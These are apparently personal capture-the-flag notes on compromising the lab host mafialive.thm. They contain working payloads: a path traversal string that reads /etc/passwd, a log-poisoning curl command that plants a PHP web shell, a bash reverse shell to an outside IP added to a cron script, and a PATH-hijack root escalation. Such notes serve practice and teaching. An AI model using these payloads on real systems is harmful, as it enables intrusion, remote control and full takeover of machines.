start with nmap

http


found : mafialive.thm --> added in /etc/hosts

email found : support@mafialive.thm

mafialive.thm --> underdevelopement

/robots.txt --> test.php

http://mafialive.thm/test.php?view=/var/www/html/development_testing/robots.txt

we can enumeration /developement_testing only. outside this directory we not allowed directory listing.

fuzz other endpoint than `view`


payload worked : http://mafialive.thm/test.php?view=/var/www/html/development_testing/..///////..///////..///////..///////etc/passwd


get shell by log poising.

`curl http://mafialive.thm -A "<?php system(\$_GET['cmd']);?>"`

then `http://mafialive.thm/test.php?view=/var/www/html/developement_testing/..///////..///////..///////..////////var/log//apache2/access.log&cmd=id`

in response we get

got shell.

cronjob found for archanjal:

`*/1 *   * * *   archangel /opt/helloworld.sh`

we can write this file.
add bash rev shell to file and get sheel as arcahngel.

`bash -i >& /dev/tcp/10.8.133.3/1337 0>&1`

in `~/secret` we found a executable `backup`

suid bit is set so we can run it as user.

run it. it uses cp without the full path.

create cp with "/bin/bash" . give execute permission. add export path with cp direcotry.
run backup get root shell.